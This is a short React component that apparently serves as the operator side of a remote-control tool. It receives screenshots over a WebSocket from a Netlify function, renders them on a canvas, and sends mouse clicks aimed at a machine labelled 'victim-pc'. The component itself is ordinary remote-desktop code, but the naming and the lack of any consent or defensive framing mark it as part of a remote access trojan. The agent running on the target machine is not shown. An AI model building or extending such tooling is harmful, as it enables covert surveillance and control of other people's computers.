// Controller.jsx
import React, { useRef, useEffect } from 'react';
const Controller = () => {
  const ws = useRef(new WebSocket('wss://your-netlify-site.netlify.app/.netlify/functions/websocket'));
  const canvasRef = useRef();

  useEffect(() => {
    ws.current.onmessage = (e) => {
      const data = JSON.parse(e.data);
      if (data.type === 'screen') {
        const img = new Image();
        img.onload = () => {
          const ctx = canvasRef.current.getContext('2d');
          ctx.drawImage(img, 0, 0, canvasRef.current.width, canvasRef.current.height);
        };
        img.src = `data:image/png;base64,${data.image}`;
      }
    };
  }, []);

  const handleClick = (e) => {
    const rect = canvasRef.current.getBoundingClientRect();
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;
    ws.current.send(JSON.stringify({
      type: 'control',
      target: 'victim-pc',
      action: 'mouse',
      x, y, click: true
    }));
  };

  return <canvas ref={canvasRef} onClick={handleClick} width={800} height={600} />;
};